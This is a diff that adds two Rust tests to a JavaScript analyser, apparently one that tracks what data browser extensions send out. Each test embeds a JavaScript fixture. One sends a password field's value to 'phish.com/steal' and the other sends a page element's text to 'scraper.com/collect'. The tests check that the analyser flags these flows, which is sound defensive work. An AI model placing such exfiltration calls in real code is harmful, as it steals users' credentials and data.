@@ -169,3 +169,43 @@ fn test_source_tracker_history() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::BrowsingHistory)));
 }
+
+#[test]
+fn test_source_tracker_user_input() {
+    let code = r#"
+        let password = document.getElementById('password').value;
+        fetch('https://phish.com/steal', { body: password });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("phish.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::UserInput(id) if id == "password")));
+}
+
+#[test]
+fn test_source_tracker_dom_element() {
+    let code = r#"
+        let content = document.querySelector('.secret-data').innerText;
+        fetch('https://scraper.com/collect', { body: content });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("scraper.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::DomElement(selector) if selector == ".secret-data")));
+}
